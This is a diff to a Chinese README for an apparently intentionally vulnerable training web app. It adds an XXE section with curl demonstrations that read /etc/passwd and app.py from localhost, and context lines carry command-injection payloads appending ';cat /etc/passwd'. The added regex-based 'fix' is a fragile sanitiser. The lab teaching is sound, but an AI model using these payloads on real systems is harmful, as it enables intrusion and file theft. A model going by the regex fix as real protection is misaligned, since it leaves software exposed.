@@ -220,6 +220,25 @@ curl -X POST http://localhost:5000/ping -d "ip=8.8.8.8;cat /etc/passwd"
 curl -X POST http://localhost:5000/ping -d "ip=8.8.8.8;ls -la"
 ```
 
+### 第九轮：XXE 外部实体注入漏洞（2 项）
+
+| # | 漏洞 | 严重程度 | 描述 |
+|:-:|:----|:-------:|:----|
+| 27 | **XXE 读取任意文件** | 🔴 严重 | `/xml-import` 检测 ENTITY+SYSTEM 后直接 `open()` 读取文件 |
+| 28 | **敏感文件泄露** | 🔴 严重 | 可读取 `/etc/passwd`、`/etc/shadow`、`app.py` 等 |
+
+#### 攻击演示
+
+```bash
+# XXE 读取 /etc/passwd
+curl -X POST http://localhost:5000/xml-import \
+  --data-urlencode 'xml_data=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><users><user><name>&xxe;</name></user></users>'
+
+# XXE 读取 app.py 源码
+curl -X POST http://localhost:5000/xml-import \
+  --data-urlencode 'xml_data=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///path/to/app.py">]><users><user><name>&xxe;</name></user></users>'
+```
+
 ---
 ---
 
@@ -371,6 +390,20 @@ cmd = ["ping", "-c", "3", ip]           # 参数列表，不用字符串
 subprocess.check_output(cmd, shell=False)  # 禁止 shell 执行
 ```
 
+### 第九轮修复：XXE 防护
+
+| # | 修复方法 | 修复后 |
+|:-:|:--------|:------:|
+| 27 | 移除 ENTITY/SYSTEM 检测和 open() 读取文件代码 | ✅ 无法通过 ENTITY 定义读取本地文件 |
+| 28 | 解析前清洗 DOCTYPE 和实体引用 | ✅ 外部实体引用被移除，XXE 攻击失败 |
+
+```python
+# 修复：XXE 防护（清洗 XML 后再解析）
+cleaned_xml = re.sub(r'<!DOCTYPE[^>]*>', '', xml_data)  # 移除 DOCTYPE
+cleaned_xml = re.sub(r'&\w+;', '', cleaned_xml)         # 移除实体引用
+root = ET.fromstring(cleaned_xml)                       # 安全解析
+```
+
 ---
 
 ## 📁 项目结构
@@ -396,7 +429,8 @@ user-management/
     ├── register.html         # 注册页
     ├── upload.html           # 头像上传页
     ├── profile.html          # 个人中心（资料 + 充值）
-    └── ping.html             # Ping 网络诊断
+    ├── ping.html             # Ping 网络诊断
+    └── xml_import.html       # XML 数据导入
 ```
 
 ---
@@ -413,6 +447,7 @@ user-management/
 | `/change-password` | POST | 修改密码（需 CSRF Token，无需原密码） | 是 |
 | `/recharge` | POST | 充值（`user_id` + `amount`，需 CSRF Token） | 是 |
 | `/page` | GET | 动态页面加载（`?name=help` 显示帮助中心） | 否 |
+| `/xml-import` | GET/POST | XML 数据导入与解析 | 是 |
 | `/ping` | GET/POST | Ping 网络诊断（需登录） | 是 |
 | `/upload` | GET/POST | 头像上传（仅允许图片） | 是 |
 | `/logout` | GET | 登出并跳转首页 | 是 |
